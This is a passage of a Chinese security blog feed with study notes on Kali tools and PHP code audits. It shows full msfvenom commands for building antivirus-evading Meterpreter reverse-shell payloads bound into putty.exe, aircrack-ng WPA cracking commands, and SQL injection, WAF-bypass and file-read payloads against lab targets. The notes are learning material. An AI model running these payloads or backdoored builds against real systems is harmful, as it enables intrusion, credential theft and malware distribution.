windows/meterpreter/reverse_tcp --arch x86 --platform windows -s 8000 -i 20 lhost=192.168.1.1 lport=6666 -f.exe &gt; ./x.exe</code></pre><hr><h1 id="o-文件输出"><a href="#o-文件输出" class="headerlink" title="-o 文件输出"></a>-o 文件输出</h1><p>-o 输出参数可以用<code>&gt;</code>号代替<br>-f 指定格式参数可以用单个大写字母代替：</p><pre><code>[H]arp[P]erlRub[Y][R]aw[J]se[X]e[D]ll[V]BA[W]arPytho[N]</code></pre><p>将payload注入到putty中，并编码</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -a x86 --platform windows -e x86/shikata_ga_nai -i 3 -x /root/下载/putty.exe -k -f exe -o /root/桌面/putty_evil.exe</code></pre><hr><h1 id="b-避免使用的字符"><a href="#b-避免使用的字符" class="headerlink" title="-b 避免使用的字符"></a>-b 避免使用的字符</h1><p>避免出现坏字符,msfvenom会自动找到一个合适的编辑器的有效载荷进行编码</p><p>例如</p><pre><code>msfvenom -p windows/meterpreter/bind_tcp -b ‘\x00’ -f raw</code></pre><hr><h1 id="c-添加自己的shellcode"><a href="#c-添加自己的shellcode" class="headerlink" title="-c 添加自己的shellcode"></a>-c 添加自己的shellcode</h1><blockquote><p>-c 自己编写的shellcode文件绝对路径</p></blockquote><hr><h1 id="i-编码次数"><a href="#i-编码次数" class="headerlink" title="-i 编码次数"></a>-i 编码次数</h1><p>迭代编码也许会有规避杀毒软件的作用，但这不是真正的免杀。</p><pre><code>msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3</code></pre><hr><h1 id="x-k-捆绑"><a href="#x-k-捆绑" class="headerlink" title="-x | -k 捆绑"></a>-x | -k 捆绑</h1><p>原先有个正常文件normal.exe 可以通过这个选项把后门捆绑到这个程序上面</p><p><code>-x</code> 指定一个exe文件作为模板<br><code>-k</code> 保护模板程序的功能,注入的payload作为一个新的进程运行，一般只在老程序中有效<br>例如:<code>windows xp</code></p><p>msfvenom使用的模板文件保存在目录<code>msf/data/templates</code></p><p>（模板文件=宿主文件=自定义的可执行文件）</p><pre><code>msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe &gt; new.exe</code></pre><p>-x calc.exe 捆绑payload到 正常文件<br>使用windows下的calc.exe作为模板文件,生成payload</p><p><code>也可以使用自己自定义的可执行文件</code></p><blockquote><p>-x 可执行文件绝对路径</p></blockquote><hr><h1 id="h-帮助"><a href="#h-帮助" class="headerlink" title="-h 帮助"></a>-h 帮助</h1><pre><code>msfvenom -h</code></pre><hr><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/" target="_blank" rel="noopener">https://www.offensive-security.com/metasploit-unleashed/msfvenom/</a><br><a href="http://blog.csdn.net/lzhd24/article/details/50664342" target="_blank" rel="noopener">http://blog.csdn.net/lzhd24/article/details/50664342</a><br><a href="http://mp.weixin.qq.com/s?__biz=MzA4NDk5NTYwNw==&amp;mid=2651425199&amp;idx=1&amp;sn=9032db8ea0d6484b072ae72adca859c6&amp;chksm=842392d7b3541bc1ff1f1e9e03c3a918b2aee9b555cd5c3c27bfb72dcd0f066e1325020d506f&amp;mpshare=1&amp;scene=23&amp;srcid=03179H3uWCT5qy3q4cZ3hsF0#rd" target="_blank" rel="noopener">http://mp.weixin.qq.com/s?__biz=MzA4NDk5NTYwNw==&amp;mid=2651425199&amp;idx=1&amp;sn=9032db8ea0d6484b072ae72adca859c6&amp;chksm=842392d7b3541bc1ff1f1e9e03c3a918b2aee9b555cd5c3c27bfb72dcd0f066e1325020d506f&amp;mpshare=1&amp;scene=23&amp;srcid=03179H3uWCT5qy3q4cZ3hsF0#rd</a></p><hr>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ariceack-ng 破解 WPA-WPA2(Wifi)</title>
    <link href="/2019/08/19/Linux/kali/aircrack-ng%E7%A0%B4%E8%A7%A3WPA-WPA2/"/>
    <url>/2019/08/19/Linux/kali/aircrack-ng%E7%A0%B4%E8%A7%A3WPA-WPA2/</url>
    
    <content type="html"><![CDATA[<h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><p>懒癌晚期，感觉没救了。。。</p><p>在开始之前，我们先来看几条基础的命令</p><blockquote><p>ifconfig -a #查看无限网卡<br>airmon-ng start wlan0 #开启无限网卡<br>airodump-ng -c &lt;信道&gt; -w &lt;自定义名称&gt; -bssid &lt;路由MAC&gt; wlan0mon #抓包<br>aireplay-ng -0 0 -a &lt;路由MAC&gt; wlan0mon #攻击合法客户端<br>aircrack-ng -w &lt;路径/字典名&gt; &lt;路径/握手包名&gt;  #跑包破解wifi密码</p></blockquote><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>这里我又偷懒了。。。下次再写</p><h1 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h1>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>无法进入监听模式解决方案</title>
    <link href="/2019/08/19/Linux/kali/%E6%97%A0%E6%B3%95%E8%BF%9B%E5%85%A5%E7%9B%91%E5%90%AC%E6%A8%A1%E5%BC%8F%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <url>/2019/08/19/Linux/kali/%E6%97%A0%E6%B3%95%E8%BF%9B%E5%85%A5%E7%9B%91%E5%90%AC%E6%A8%A1%E5%BC%8F%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    
    <content type="html"><![CDATA[<h3 id="无法进入监听模式解决方案"><a href="#无法进入监听模式解决方案" class="headerlink" title="无法进入监听模式解决方案"></a>无法进入监听模式解决方案</h3><p>1.在设置监听模式前先输入<code>airmon-ng check kill</code>结束进程<br>2：和以前一样载入网卡<code>airmon-ng  start wlan0</code>（自己的网卡名）<br>3：他会自动创建一个 <code>wlan0mon</code>接口 记住这个 接口名 而不是以前的mon0<br>4：建立监听<code>airodump-ng wlan0mon</code></p><a id="more"></a><p>如果在第四步发现出现错误 那么 有三种可能第一 你的网卡不支持监听模式，第二你的wlan0mon输入错误，第三网卡被其他进程给调用无法获取<br>第三种情况解决方法：<br>执行<code>airmon-ng check kill</code><br>执行<code>ifconfig wlan0mon up</code><br><code>airmon-ng stop wlan0mon</code><br>最后跳回上面的第二部进行<br>如果还不行 那就拔掉网卡 或重启<br>再次ifconfig 查找时候有无线网卡 标识名一般以wlan开头<br>如果没有 就 <code>ifconfig wlan0</code> （或者wlan1 wlan2.。。。载入） up<br>发现了  并载入了 wlan0跟着第一步走一般不会出错</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kali安装vmtools</title>
    <link href="/2019/08/19/Linux/kali/kali%E5%AE%89%E8%A3%85vmtools/"/>
    <url>/2019/08/19/Linux/kali/kali%E5%AE%89%E8%A3%85vmtools/</url>
    
    <content type="html"><![CDATA[<h3 id="0x00-安装vmtools"><a href="#0x00-安装vmtools" class="headerlink" title="0x00 安装vmtools"></a>0x00 安装vmtools</h3><p>安装好<code>kali</code>之后<br>虚拟机–安装<code>VMware Tools</code></p><a id="more"></a><p><img src="/images/Linux/kali/kali%E5%AE%89%E8%A3%85vmtools/0.png" srcset="/img/loading.gif" alt=""></p><p>点击之后可能会有一个弹窗,点是即可<br>进入cd驱动中把 vm压缩包拖动到桌面<br><img src="/images/Linux/kali/kali%E5%AE%89%E8%A3%85vmtools/1.png" srcset="/img/loading.gif" alt=""></p><p>然后桌面右键 – 打开终端 – 进入桌面 – 运行命令对vm压缩包进行解压</p><pre><code class="bash">lscd 桌面 或 cd Desktoptar -zxvf VMwareTools 按tab键补全 回车即可</code></pre><p>接着 进入解压的文件夹</p><pre><code>cd vmware 按tab键补全./vmware-install.pl一路回车,一直到如下图</code></pre><p><img src="/images/Linux/kali/kali%E5%AE%89%E8%A3%85vmtools/2.png" srcset="/img/loading.gif" alt=""></p><h3 id="0x01-重启"><a href="#0x01-重启" class="headerlink" title="0x01 重启"></a>0x01 重启</h3><p>接着输入<code>reboot</code>重启虚拟机<br>之后即可</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Typecho 反序列化漏洞导致前台getshell漏洞复现</title>
    <link href="/2019/08/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/typecho%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96getshell/"/>
    <url>/2019/08/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/typecho%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96getshell/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>影响版本：v1.1 ~ 15.5.12 及以前的版本</p><p>该漏洞发生在 install.php文件中,在参数 __typecho_config中我们可以传入一些构造数据<br>使程序进行一系列的操作，最后由<code>call_user_func()</code>函数 或者 是 <code>array_map()</code> 实现任意代码执行</p><a id="more"></a><h1 id="Code-分析"><a href="#Code-分析" class="headerlink" title="Code 分析"></a>Code 分析</h1><h2 id="文件-install-php"><a href="#文件-install-php" class="headerlink" title="文件: install.php"></a>文件: install.php</h2><p>![](/images/PHP/代码审计/typecho 反序列前台getshell/0.png)</p><p>在这 我们发现 <code>__typecho_config</code> 参数是可控的</p><p>经过 <code>base64 解码</code> 再进行反序列化 最终赋值给 <code>$config</code></p><p>然后往下看到了 一个实例化类的操作 <code>new Typecho_Db</code></p><p>这里我们想是否 能利用 这个实例化类的操作<br>触发一些魔法函数，再看这些魔法函数中是否有一些危险函数</p><p>这里最有可能触发的 就是 <code>__construct()</code>这个魔法函数</p><p><code>__construct()</code>触发条件：当一个对象被创建时调用的</p><h2 id="文件-Db-php"><a href="#文件-Db-php" class="headerlink" title="文件: Db.php "></a>文件: Db.php </h2><p>我们在整个源码中搜索 <code>__construct()</code> 函数<br>发现 Db.php文件 调用了 __construct() 函数<br>![](/images\PHP\代码审计\typecho 反序列前台getshell\1.png)</p><p>这里可以 看到并没有什么可以直接利用的危险函数</p><p>可是，这里执行了一个字符串拼接的操作(字符串拼接一个变量的操作)</p><p>adapterName 对应 config 里面的adapter</p><p>如果我们用 <code>adapter</code> 来实例化一个类,PHP是弱类型的语音<br><code>把一个字符串和类拼接的时候会强制把类转换成字符串，这个时候就会触发 __toString 方法</code></p><p><code>__toString()</code>的触发条件：把类当作字符串使用时触发</p><h2 id="文件：Feed-php"><a href="#文件：Feed-php" class="headerlink" title="文件：Feed.php"></a>文件：Feed.php</h2><p>接下来就是搜索<code>__toString()</code>函数</p><p>在Feed.php文件中发现了__toString()函数<br><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%89%8D%E5%8F%B0getshell/2.png" srcset="/img/loading.gif" alt=""></p><p>在这函数中 并没有发现可以直接利用的函数或参数</p><p>于是对代码进行分析</p><p>发现 <code>$item</code> 是 <code>$this -&gt; _items</code> 的 <code>foreach 循环</code>出来的</p><p>并且 <code>$this -&gt; _items</code> 是Typecho_Feed类 的 一个<code>private属性</code></p><p>在这里如果可以将 <code>$item[&#39;author&#39;] 定义为一个类</code></p><p><code>而该类中未定义screenName变量</code></p><p>当执行到 290行 <code>$item[&#39;author&#39;] -&gt; screenName</code> 时</p><p>则会自动调用<code>__get()</code>魔法函数</p><p><code>__get()</code>触发条件：用于从不可访问的属性读取数据</p><h2 id="文件：Request-php"><a href="#文件：Request-php" class="headerlink" title="文件：Request.php"></a>文件：Request.php</h2><p>接下来我们就 需要 寻找一个类中有 __get()魔法函数，并且这个函数中有可利用的危险函数</p><p>发现 Db.php文件 调用了 __get() 函数</p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%89%8D%E5%8F%B0getshell/3.png" srcset="/img/loading.gif" alt=""></p><p>发现 __get()函数 进行了一系列的操作之后 进入<code>_applyFilter</code>函数</p><p>发现 这个函数中 调用了两个可以执行任意代码危险函数<br><code>array_map()</code><br><code>call_user_func()</code></p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%89%8D%E5%8F%B0getshell/4.png" srcset="/img/loading.gif" alt=""></p><p>接下来我们 看下危险代码的函数的参数是否 可控</p><p>发现<code>_filter</code> 参数，在文件刚开始就定义了<br><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%89%8D%E5%8F%B0getshell/5.png" srcset="/img/loading.gif" alt=""><br>说明这是可控的</p><p>而 <code>$value</code> 参数是 通过<code>_params</code>获取的 然后通过 __get()方法一系列操作之后 传入<code>_applyFilter</code>函数的<br>于是我们搜索<code>_params</code>,发现也是可控的<br><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%89%8D%E5%8F%B0getshell/6.png" srcset="/img/loading.gif" alt=""><br><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%89%8D%E5%8F%B0getshell/7.png" srcset="/img/loading.gif" alt=""></p><h2 id="整个过程"><a href="#整个过程" class="headerlink" title="整个过程"></a>整个过程</h2><p>数据的输入点为 install.php 文件中的参数 _typecho_config，从外部读入我们构造的序列化数据</p><p>是程序会进入类的 Typecho_Db类的 __ocnstruct()函数,然后进入 Typecho_Feed类的 _toString()函数</p><p>再依次进入 Typecho_Request类的 __get() ==&gt; get() ==&gt; _applyFilter()函数</p><p>最后由 call_user_func() 或 array_map() 函数实现任意代码执行</p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%89%8D%E5%8F%B0getshell/8.png" srcset="/img/loading.gif" alt=""></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="漏洞复现条件"><a href="#漏洞复现条件" class="headerlink" title="漏洞复现条件"></a>漏洞复现条件</h2><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%89%8D%E5%8F%B0getshell/9.png" srcset="/img/loading.gif" alt=""></p><p>1.在 install.php 文件开头声明了 必须要有 <code>finish</code> 参数才可以进行下一步操作<br>2.这里拦截了跨站请求，说明<code>referer</code>需要是本站才行</p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%89%8D%E5%8F%B0getshell/10.png" srcset="/img/loading.gif" alt=""><br>在install.php 调用的Typecho_Cookie 这里类中发现不仅可以cookie访问，还可以post访问</p><p>这里我就不写poc了，因为我这里只是对漏洞进行复现，学习思路，做下笔记<br>就直接进行漏洞复现了</p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%89%8D%E5%8F%B0getshell/11.png" srcset="/img/loading.gif" alt=""></p><h1 id="文章说明：该文章是-看漏洞银行视频，作的笔记，学习思路"><a href="#文章说明：该文章是-看漏洞银行视频，作的笔记，学习思路" class="headerlink" title="文章说明：该文章是 看漏洞银行视频，作的笔记，学习思路"></a>文章说明：该文章是 看漏洞银行视频，作的笔记，学习思路</h1>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vauditdemo二次注入 复现</title>
    <link href="/2019/08/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/vauditdemo%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
    <url>/2019/08/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/vauditdemo%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="扯淡"><a href="#扯淡" class="headerlink" title="扯淡"></a>扯淡</h1><p>在瞎扯淡中，又扯到了该靶场，不死心的基友再次测试二次注入<br>我们两个再次开启了扯淡模式，然而我的提议牛头不对马嘴（场面气氛一度尴尬）<br>最后它成功测试出了二次注入，于是我就偷偷摸摸的学习ing</p><a id="more"></a><h1 id="code"><a href="#code" class="headerlink" title="code"></a>code</h1><ul><li><code>regCheck.php</code>文件</li></ul><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/vauditdemo%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/1.png" srcset="/img/loading.gif" alt=""></p><p>可以看到此处是经过过滤的，但是二次注入，大多数都是数据在数据库中进行了还原</p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/vauditdemo%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/2.png" srcset="/img/loading.gif" alt=""></p><p>可以看到确实是还原了</p><p>但是此处因为我们是注册时，先把用户名带入到<code>$_session[&#39;username&#39;]</code>后就写入数据库，并跳转到<code>user.php</code>页面</p><p>所以此处并不会造成错误的产生（二次注入）</p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/vauditdemo%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/3.png" srcset="/img/loading.gif" alt=""></p><p>我们需要重新登录</p><ul><li><code>logCheck.php</code>文件</li></ul><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/vauditdemo%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/4.png" srcset="/img/loading.gif" alt=""></p><p>可以看到，我们输入的数据再一次被进行了过滤,最终语句如下：</p><pre><code class="php">SELECT * FROM users WHERE user_name = &#39;a\&#39;&#39; AND user_pass = SHA(&#39;123456&#39;);</code></pre><p>但是，这是可以正常执行的</p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/vauditdemo%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/5.png" srcset="/img/loading.gif" alt=""></p><p>在执行语句之前，把<code>user_name</code>赋值给<code>$_SESSION[&#39;username&#39;]</code><br>但是并没有进行过滤，带着我们最开始的语句<code>a&#39;</code>，跳转到<code>user.php</code>页面</p><ul><li><code>user.php</code></li></ul><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/vauditdemo%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/6.png" srcset="/img/loading.gif" alt=""></p><p>可以看到，这里它使用了<code>$_SESSION[&#39;username&#39;]</code>进行了查询</p><p>由于，他是带着我们恶意构造的语句，也没有进行过滤</p><p>所以导致，此处的语句执行错误，并向用户打印<code>Error!</code></p><pre><code class="php">SELECT * FROM users WHERE user_name = &#39;a&#39;&#39;</code></pre><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/vauditdemo%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/7.png" srcset="/img/loading.gif" alt=""></p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/vauditdemo%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/8.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>失败的sql注入寻找之旅</title>
    <link href="/2019/08/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/vauditdemo%E6%B3%A8%E5%85%A5/"/>
    <url>/2019/08/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/vauditdemo%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="扯淡"><a href="#扯淡" class="headerlink" title="扯淡"></a>扯淡</h1><p>瞎搞了2个小时，盘Sql注入，发现有一个php文件可能存在<br>结果看到被函数过滤了，在这里求助了九世<br>说该处只有在GBK编码的情况下，才能进行注入绕过<br>九世测试了下，发现一个搜索型的注入<br>而我，则是发现一处注入结果在最后绕不过列表名的转义<br>总结：总有一天我要砍代码九条街</p><a id="more"></a><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>刚刚学习代码注入，就从大局把握开始审计学习</p><ul><li><code>index.php</code></li></ul><pre><code class="php">require_once(&#39;sys/config.php&#39;);require_once(&#39;header.php&#39;);</code></pre><p>发现它开头包含了两个文件，我们进行跟进</p><ul><li><code>config.php</code></li></ul><pre><code class="php">error_reporting(0);if (!file_exists($_SERVER[&quot;DOCUMENT_ROOT&quot;].&#39;/sys/install.lock&#39;)){    header(&quot;Location: /install/install.php&quot;);    exit;}include_once(&#39;../sys/lib.php&#39;);</code></pre><p>对文件进行了判断，然后包含了<code>lib.php</code>文件</p><ul><li><code>lib.php</code></li></ul><p>在该文件中，我们发现有一个自定义的sql注入过滤函数</p><pre><code class="php">function sqlwaf( $str ) {    $str = str_ireplace( &quot;and&quot;, &quot;sqlwaf&quot;, $str );    $str = str_ireplace( &quot;or&quot;, &quot;sqlwaf&quot;, $str );    $str = str_ireplace( &quot;from&quot;, &quot;sqlwaf&quot;, $str );    $str = str_ireplace( &quot;execute&quot;, &quot;sqlwaf&quot;, $str );    $str = str_ireplace( &quot;update&quot;, &quot;sqlwaf&quot;, $str );    $str = str_ireplace( &quot;count&quot;, &quot;sqlwaf&quot;, $str );    $str = str_ireplace( &quot;chr&quot;, &quot;sqlwaf&quot;, $str );    $str = str_ireplace( &quot;mid&quot;, &quot;sqlwaf&quot;, $str );    $str = str_ireplace( &quot;char&quot;, &quot;sqlwaf&quot;, $str );    $str = str_ireplace( &quot;union&quot;, &quot;sqlwaf&quot;, $str );    $str = str_ireplace( &quot;select&quot;, &quot;sqlwaf&quot;, $str );    $str = str_ireplace( &quot;delete&quot;, &quot;sqlwaf&quot;, $str );    $str = str_ireplace( &quot;insert&quot;, &quot;sqlwaf&quot;, $str );    $str = str_ireplace( &quot;limit&quot;, &quot;sqlwaf&quot;, $str );    $str = str_ireplace( &quot;concat&quot;, &quot;sqlwaf&quot;, $str );    $str = str_ireplace( &quot;\\&quot;, &quot;\\\\&quot;, $str );    $str = str_ireplace( &quot;&amp;&amp;&quot;, &quot;&quot;, $str );    $str = str_ireplace( &quot;||&quot;, &quot;&quot;, $str );    $str = str_ireplace( &quot;&#39;&quot;, &quot;&quot;, $str );    $str = str_ireplace( &quot;%&quot;, &quot;\%&quot;, $str );    $str = str_ireplace( &quot;_&quot;, &quot;\_&quot;, $str );    return $str;}</code></pre><p>然而，该处的过滤函数存在着问题</p><pre><code class="php">$str = str_ireplace( &quot;&amp;&amp;&quot;, &quot;&quot;, $str );$str = str_ireplace( &quot;||&quot;, &quot;&quot;, $str );$str = str_ireplace( &quot;&#39;&quot;, &quot;&quot;, $str );</code></pre><p>利用这三个问题转义，我们可以成功绕过一些被该函数转义的关键字</p><p>例如：<code>unio||n</code>，<code>selec&amp;&amp;t</code></p><p>该文件下方，还定义了一个<code>clean_input</code>函数进行过滤</p><pre><code class="php">function clean_input( $dirty ) {    return mysql_real_escape_string( stripslashes( $dirty ) );}</code></pre><p>其他的页面被该函数过滤了，绕了我好久都没绕过</p><p>我们此处可以进行全局搜索sql语句，进行注入（找到了过滤的，查看下能够进行sql注入）</p><blockquote><p>Ps：千万不要和我一样一直盘一个地方，要多尝试</p></blockquote><p>此处，我们的语句：<code>select *</code></p><ul><li><code>messageDetail.php</code></li></ul><pre><code class="php">if ( !empty( $_GET[&#39;id&#39;] ) ) {    $id = sqlwaf( $_GET[&#39;id&#39;] );    $query = &quot;SELECT * FROM comment WHERE comment_id = $id&quot;;    $data = mysql_query( $query, $conn ) or print_r(mysql_error());</code></pre><p>此处并没有过滤就执行了，不过该注入点在留言板中，所以你需要一个留言</p><p>由于该出我们并不需要进行闭合，直接进行注入即可（盲注，延时注入）</p><pre><code class="php">id=1 an&amp;&amp;d if((1=2),1,500)</code></pre><p>我这的靶场可能有点问题，所以这里的图暂时放不了，有空补上</p><h1 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h1><p>这里就交给九世了</p><p><a href="https://422926799.github.io/2019/02/01/VAuditDemo-shooting-range-message-search-injection/" target="_blank" rel="noopener">https://422926799.github.io/2019/02/01/VAuditDemo-shooting-range-message-search-injection/</a></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>代码审计之文件读取</title>
    <link href="/2019/08/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
    <url>/2019/08/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>可以在被访问的文件系统中读取或写入任意内容，往往能够从服务器上获取敏感信息文件<br>正常读取的文件内容没有经过校验或者不严格，用户可以控制这个变量读取任意文件</p><h2 id="文件读取函数"><a href="#文件读取函数" class="headerlink" title="文件读取函数"></a>文件读取函数</h2><ul><li><code>file_get_contents()</code></li><li><code>highlight_file()</code></li><li><code>fopen()</code></li><li><code>readfile()</code></li><li><code>fread()</code></li><li><code>fgetss()</code></li><li><code>fgets()</code></li><li><code>parse_ini_file()</code></li><li><code>show_source()</code></li><li><code>file()</code></li><li><code>fpassthru</code></li></ul><blockquote><p><code>allow_url_fopen</code>：激活URL形式的<code>fopen封装协议</code>，使得可以访问URL对象例如文件。<br>默认的封装洗衣提供用FTP和HTTP协议来访问远程文件<br>一些扩展库，例如zlib可能会注册更多的封装协议</p></blockquote><a id="more"></a><h1 id="靶场任意文件读取"><a href="#靶场任意文件读取" class="headerlink" title="靶场任意文件读取"></a>靶场任意文件读取</h1><ul><li><code>avatar.php</code>文件<br><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5CPHP/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/1.png" srcset="/img/loading.gif" alt=""></li></ul><pre><code class="php">echo file_get_contents($_SESSION[&#39;avatar&#39;]);</code></pre><p>可以看到该函数直接接收了一个<code>$_SESSION[&#39;avatar&#39;]</code><br>全局查找该函数怎么来的</p><ul><li><code>logCheck.php</code>文件<br><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5CPHP/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/2.png" srcset="/img/loading.gif" alt=""></li></ul><p>可以看到该参数是在登录的时候创建的，但是此处我们没有办法进行修改<br>继续寻找</p><ul><li><code>logCheck.php</code></li></ul><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5CPHP/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/3.png" srcset="/img/loading.gif" alt=""></p><p>在该文件可以看到，这里存入数据库后，刷新了缓存</p><p>是先<code>文件上传</code> &gt;&gt; <code>判断后缀</code> &gt;&gt; <code>拼接路径</code> &gt;&gt; <code>更新数据库</code> &gt;&gt; <code>更新$_SESSION[&#39;avatar&#39;]</code></p><p>其实看到这里，我有点懵，然后老司机（车王）说他会，看了之后觉得自己的思路太死板了</p><pre><code>php $query = &quot;UPDATE users SET user_avatar = &#39;$avatar&#39; WHERE user_id = &#39;{$_SESSION[&#39;user_id&#39;]}&#39;&quot;;</code></pre><p>可以看到该语句并没有任何的过滤，直接写入<code>$avatar</code>变量</p><p>车王告诉我：<code>该update语句，可设置多个字段，只取最后一个字段为正确的</code></p><pre><code class="php"> UPDATE users SET user_avatar = &#39;$avatar&#39; user_avatar=&#39;../sys/config.php&#39;  # WHERE user_id = &#39;{$_SESSION[&#39;user_id&#39;]}&#39;</code></pre><p> 直接屏蔽后where条件后，默认是把该字段全部写成统一的</p><p>（你可以自己添加where条件，可是我懒。。。）</p><p>最终只要在上传文件的时候在文件名处写上图片格式后缀并屏蔽掉即可</p><pre><code>php 1.png&#39; ,user_avatar=../sys/config.php #.png</code></pre><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p>流程：</p><ul><li>先上传文件 &gt; 